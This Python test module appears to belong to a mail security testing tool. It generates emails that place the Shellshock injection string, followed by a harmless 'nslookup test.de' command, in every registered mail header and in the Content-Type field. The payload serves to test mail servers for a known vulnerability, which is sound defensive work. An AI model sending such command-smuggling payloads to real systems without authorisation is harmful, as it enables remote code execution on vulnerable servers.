# Empty and almost empty mails

from .base import MailTestBase
from email.mime.text import MIMEText
from email.message import Message

class ExploitsTest(MailTestBase):
    active = True
    identifier = "exploits"
    name = "Exploits"
    description = "Testing known exploits (e.g. shellshock)"


    def generateTestCases(self):

        # source: https://www.iana.org/assignments/message-headers/message-headers.xml
        headers_list = """Accept-Language
Alternate-Recipient
Archived-At
Authentication-Results
Auto-Submitted
Autoforwarded
Autosubmitted
Bcc
Cc
Comments
Content-Identifier
Content-Return
Conversion
Conversion-With-Loss
DL-Expansion-History
Date
Deferred-Delivery
Delivery-Date
Discarded-X400-IPMS-Extensions
Discarded-X400-MTS-Extensions
Disclose-Recipients
Disposition-Notification-Options
Disposition-Notification-To
DKIM-Signature
Downgraded-Bcc
Downgraded-Cc
Downgraded-Disposition-Notification-To
Downgraded-Final-Recipient
Downgraded-From
Downgraded-In-Reply-To
Downgraded-Mail-From
Downgraded-Message-Id
Downgraded-Original-Recipient
Downgraded-Rcpt-To
Downgraded-References
Downgraded-Reply-To
Downgraded-Resent-Bcc
Downgraded-Resent-Cc
Downgraded-Resent-From
Downgraded-Resent-Reply-To
Downgraded-Resent-Sender
Downgraded-Resent-To
Downgraded-Return-Path
Downgraded-Sender
Downgraded-To
Encoding
Encrypted
Expires
Expiry-Date
From
Generate-Delivery-Report
Importance
In-Reply-To
Incomplete-Copy
Keywords
Language
Latest-Delivery-Time
List-Archive
List-Help
List-ID
List-Owner
List-Post
List-Subscribe
List-Unsubscribe
List-Unsubscribe-Post
Message-Context
Message-ID
Message-Type
MMHS-Exempted-Address
MMHS-Extended-Authorisation-Info
MMHS-Subject-Indicator-Codes
MMHS-Handling-Instructions
MMHS-Message-Instructions
MMHS-Codress-Message-Indicator
MMHS-Originator-Reference
MMHS-Primary-Precedence
MMHS-Copy-Precedence
MMHS-Message-Type
MMHS-Other-Recipients-Indicator-To
MMHS-Other-Recipients-Indicator-CC
MMHS-Acp127-Message-Identifier
MMHS-Originator-PLAD
MT-Priority
Obsoletes
Organization
Original-Encoded-Information-Types
Original-From
Original-Message-ID
Original-Recipient
Originator-Return-Address
Original-Subject
PICS-Label
Prevent-NonDelivery-Report
Priority
Received
Received-SPF
References
Reply-By
Reply-To
Require-Recipient-Valid-Since
Resent-Bcc
Resent-Cc
Resent-Date
Resent-From
Resent-Message-ID
Resent-Reply-To
Resent-Sender
Resent-To
Return-Path
Sender
Sensitivity
Solicitation
Subject
Supersedes
TLS-Report-Domain
TLS-Report-Submitter
To
VBR-Info
X400-Content-Identifier
X400-Content-Return
X400-Content-Type
X400-MTS-Identifier
X400-Originator
X400-Received
X400-Recipients
X400-Trace
Apparently-To
ARC-Authentication-Results
ARC-Message-Signature
ARC-Seal
EDIINT-Features
Eesst-Version
Errors-To
Form-Sub
Jabber-ID
MMHS-Authorizing-Users
Privicon
SIO-Label
SIO-Label-History
X-Archived-At
X-Mittente
X-Ricevuta
X-Riferimento-Message-ID
X-TipoRicevuta
X-Trasporto
X-VerificaSicurezza"""

        headers_list = headers_list.splitlines()

        # shellshock string
        shellshock = "() { :; }; "

        # shellshock cmd
        cmd = "nslookup test.de"

        # shellshock as mime text iterating all header fields
        for header in headers_list:
            msg = MIMEText("shellshock")
            msg["Subject"] = "shellshock"
            msg[header] = shellshock + cmd
            yield msg

            # shellshock as plain text iterating all header fields
            msg = Message()
            msg["Subject"] = "shellshock"
            msg[header] = shellshock + cmd
            yield msg

        # shellshock in content-type 
        # Content-Type: text/() { :; }; nslookup test.de; charset="us-ascii"
        msg = MIMEText(shellshock + cmd, shellshock + cmd)
        msg["Subject"] = "shellshock"
        yield msg
